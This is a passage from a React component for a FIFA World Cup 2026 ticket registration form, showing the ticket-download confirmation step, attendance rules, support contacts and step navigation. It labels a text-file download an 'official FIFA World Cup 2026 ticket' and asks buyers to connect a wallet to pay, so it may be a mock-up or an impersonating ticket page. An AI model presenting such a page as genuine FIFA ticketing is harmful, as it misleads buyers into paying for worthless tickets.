                  className="w-full bg-gradient-to-r from-blue-600 to-blue-800 hover:from-blue-700 hover:to-blue-900 text-white font-bold py-4 px-6 rounded-lg transition-all duration-300 transform hover:scale-105 flex items-center justify-center space-x-3"
                >
                  <Download className="h-6 w-6" />
                  <span>Download Your Ticket</span>
                  <FileText className="h-6 w-6" />
                </button>
                
                <p className="text-gray-600 text-sm">
                  Your official FIFA World Cup 2026 ticket will be downloaded as a text file. 
                  Please keep it safe and present it at the stadium entrance.
                </p>
              </div>

              {/* Additional Information */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                <h4 className="font-semibold text-blue-800 mb-2">Important Information:</h4>
                <ul className="text-blue-700 text-sm space-y-1 text-left">
                  <li>• Your ticket has been sent to your email address</li>
                  <li>• Arrive at the stadium at least 2 hours before match time</li>
                  <li>• Bring a valid ID that matches the ticket holder name</li>
                  <li>• Tickets are non-transferable and non-refundable</li>
                  <li>• Contact our support team if you have any questions</li>
                </ul>
              </div>

              {/* Contact Support */}
              <div className="bg-gray-50 rounded-lg p-4">
                <h4 className="font-semibold text-gray-800 mb-2">Need Help?</h4>
                <div className="text-sm text-gray-600 space-y-1">
                  <div>📞 Phone: +1 (555) 123-4567</div>
                  <div>📱 WhatsApp: {whatsappNumber}</div>
                  <div>📧 Email: tickets@worldcup2026.com</div>
                </div>
              </div>

              {/* Close Button */}
              <button
                type="button"
                onClick={onClose}
                className="bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-all duration-300"
              >
                Close
              </button>
            </div>
          )}

          {/* Navigation Buttons */}
          {currentStep < 5 && (
            <div className="flex justify-between mt-8 pt-6 border-t">
              {currentStep > 1 && (
                <button
                  type="button"
                  onClick={handlePrevStep}
                  className="px-6 py-2 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors"
                >
                  Previous
                </button>
              )}
              {currentStep < 4 ? (
                <button
                  type="button"
                  onClick={handleNextStep}
                  className="ml-auto px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
                >
                  Next
                </button>
              ) : (
                <div className="ml-auto">
                  <p className="text-sm text-gray-600">Connect your wallet and complete payment to finish your order</p>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default RegistrationForm;